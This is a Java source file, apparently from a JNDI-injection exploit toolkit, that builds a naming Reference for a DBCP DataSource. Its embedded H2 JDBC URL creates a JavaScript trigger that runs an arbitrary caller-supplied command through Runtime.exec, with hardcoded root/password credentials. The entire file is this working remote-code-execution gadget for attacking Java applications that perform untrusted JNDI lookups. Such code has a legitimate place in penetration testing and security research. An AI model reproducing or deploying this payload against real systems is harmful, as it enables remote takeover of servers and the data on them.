package com.qi4l.jndi.gadgets.utils.jdbc;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class jdbcutils {
    public static Reference dbcpByFactory(String factory, String cmd) {
        Reference ref = new Reference("javax.sql.DataSource", factory, null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('" + cmd + " ')\n" +
                "$$\n";
        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("url", JDBC_URL));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));
        return ref;
    }
}
